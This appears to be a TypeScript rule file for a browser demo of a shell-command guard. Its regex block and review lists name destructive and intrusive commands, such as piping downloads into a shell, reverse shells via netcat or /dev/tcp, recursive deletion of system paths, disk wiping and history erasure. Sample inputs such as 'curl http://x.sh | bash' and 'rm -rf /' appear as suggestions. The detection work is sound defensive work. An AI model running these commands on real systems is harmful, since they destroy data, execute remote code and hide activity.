import type { Verdict } from "./iaac";

/*
 * "Try to break it" simulator rules. Pure client-side string matching for the website demo:
 * nothing is executed or sent anywhere. The real IAAC uses on-box AI and 240+ MITRE-mapped
 * rules. Rules are checked top-down; the first match wins for a given command string.
 */

export type Rule = { verdict: Verdict; pattern: RegExp; reason: string };

const SYS = "(?:/|/\\*|~|/(?:etc|bin|boot|usr|var|lib|lib64|sbin|root|home|opt|srv|dev|proc|sys)(?:/\\S*)?)";

export const rules: Rule[] = [
  // ---- BLOCK ----
  { verdict: "block", pattern: new RegExp(`\\brm\\s+(?:-\\S+\\s+)*-\\S*r\\S*\\s+(?:-\\S+\\s+)*${SYS}(?:\\s|$)`), reason: "Recursive delete of a system path" },
  { verdict: "block", pattern: /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, reason: "Fork bomb: would exhaust the server" },
  { verdict: "block", pattern: /\b(?:curl|wget)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b/, reason: "Remote script piped straight into a shell" },
  { verdict: "block", pattern: /base64\s+(?:-d|--decode)\b.*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/, reason: "Obfuscated payload decoded into a shell" },
  { verdict: "block", pattern: /\b(?:nc|ncat|netcat)\b.*\s-[a-z]*e\b|\/dev\/tcp\/|\bsocat\b.*exec:/, reason: "Reverse shell to an outside host" },
  { verdict: "block", pattern: /\bhistory\s+-c\b|\bunset\s+histfile\b|\bhistsize=0\b|>\s*~?\/?(?:\S*\/)?\.bash_history|\brm\b.*\.bash_history/, reason: "Erasing command history to cover tracks" },
  { verdict: "block", pattern: /\bdd\b.*\bof=\/dev\/(?:sd|hd|nvme|xvd|vd)|\bmkfs(?:\.\w+)?\b|\bshred\b.*\/dev\/|\bwipefs\b/, reason: "Overwriting a disk device" },
  { verdict: "block", pattern: /\/etc\/shadow\b/, reason: "Touching password hashes" },
  { verdict: "block", pattern: /(?:>|tee\b|sed\s+-i|\bvi\b|\bvim\b|\bnano\b|visudo).*\/etc\/(?:sudoers|passwd)\b|\/etc\/(?:sudoers|passwd)\b.*(?:>>?|tee)/, reason: "Editing sudo or account files" },
  { verdict: "block", pattern: /\b(?:systemctl|service)\s+(?:stop|disable|mask|kill)\s+iaac\b|\b(?:kill|pkill|killall)\b.*\biaac\b/, reason: "Attempt to disable the guard" },
  { verdict: "block", pattern: /\b(?:systemctl|service)\s+(?:stop|disable|mask)\s+(?:auditd|rsyslog|syslog|journald|systemd-journald)\b|\bauditctl\s+-[De]\s*0?/, reason: "Turning off audit logging" },
  { verdict: "block", pattern: new RegExp(`\\bchmod\\s+(?:-\\S+\\s+)*(?:777|a\\+rwx|o\\+w)\\s+${SYS}(?:\\s|$)`), reason: "Making system files world-writable" },
  { verdict: "block", pattern: /\bcrontab\b.*\b(?:curl|wget)\b|\b(?:curl|wget)\b.*\bcrontab\b/, reason: "Planting a persistent download job" },

  // ---- REVIEW ----
  { verdict: "review", pattern: /\bsudo\s+(?:su\b|-i\b|-s\b|(?:ba|z)?sh\b)|^su(?:\s+-)?(?:\s+root)?$/, reason: "Escalating to a root shell; paused for approval" },
  { verdict: "review", pattern: /\bdocker\s+(?:rm|rmi|kill|stop)\b.*\bprod|\bdocker\s+(?:system|volume|container)\s+prune\b/, reason: "Destructive action on production; paused for approval" },
  { verdict: "review", pattern: /\bkubectl\s+delete\b/, reason: "Deleting Kubernetes resources; sent to a human" },
  { verdict: "review", pattern: /\bdrop\s+(?:database|table|schema)\b|\btruncate\s+table\b/, reason: "Destroying database data; needs approval" },
  { verdict: "review", pattern: /\biptables\s+-F\b|\bufw\s+disable\b|\bsetenforce\s+0\b/, reason: "Weakening host defences; sent to a human" },
  { verdict: "review", pattern: /\buseradd\b|\busermod\s+.*-a?G\s*(?:sudo|wheel|root)\b|\bpasswd\s+root\b/, reason: "Granting new privileges; needs approval" },
  { verdict: "review", pattern: /\bchmod\s+(?:-\S+\s+)*(?:777|a\+rwx)\b/, reason: "World-writable permissions; sent to a human" },
  { verdict: "review", pattern: /\brm\s+(?:-\S+\s+)*-\S*r/, reason: "Recursive delete; paused for approval" },
  { verdict: "review", pattern: /\b(?:shutdown|reboot|poweroff|halt|init\s+[06])\b/, reason: "Taking the server down; needs approval" },

  // ---- ALLOW ----
  {
    verdict: "allow",
    pattern:
      /^(?:sudo\s+)?(?:ls|ll|la|cat|less|more|head|tail|grep|egrep|rg|find|pwd|whoami|id|uptime|df|du|free|ps|top|htop|uname|date|echo|which|stat|wc|env|hostname|lsblk|ss|netstat|journalctl|history|man|dig|ping|ip\s+(?:a|addr|r|route)|systemctl\s+status|docker\s+(?:ps|images|logs)|kubectl\s+(?:get|describe|logs)|git\s+(?:status|log|diff|show))\b/,
    reason: "Routine read-only command",
  },
  {
    verdict: "allow",
    pattern: /^(?:sudo\s+)?(?:apt(?:-get)?|yum|dnf)\s+(?:update|upgrade|install|list|search)\b|^(?:sudo\s+)?systemctl\s+(?:restart|reload|start)\s+(?!iaac)\S+/,
    reason: "Routine maintenance",
  },
  { verdict: "allow", pattern: /^(?:curl|wget)\b(?!.*\|)/, reason: "Downloading a file; nothing executed" },
];

const severity: Record<Verdict, number> = { allow: 0, review: 1, block: 2 };

export type Judgement = { verdict: Verdict; reason: string };

function judgeOne(cmd: string): Judgement {
  for (const r of rules) if (r.pattern.test(cmd)) return { verdict: r.verdict, reason: r.reason };
  return { verdict: "review", reason: "Unrecognised command; sent to a human to decide" };
}

/** Judge a command line. Chained commands (; && ||) are judged per part; the most severe wins. */
export function judge(input: string): Judgement | null {
  const cmd = input.trim().replace(/\s+/g, " ").toLowerCase();
  if (!cmd) return null;
  const parts = [cmd, ...cmd.split(/\s*(?:;|&&|\|\|)\s*/).filter(Boolean)];
  let worst: Judgement | null = null;
  for (const p of parts) {
    const j = judgeOne(p);
    if (!worst || severity[j.verdict] > severity[worst.verdict]) worst = j;
  }
  return worst;
}

export const suggestions = ["ls -la", "curl http://x.sh | bash", "history -c", "docker rm prod-db", "rm -rf /"];
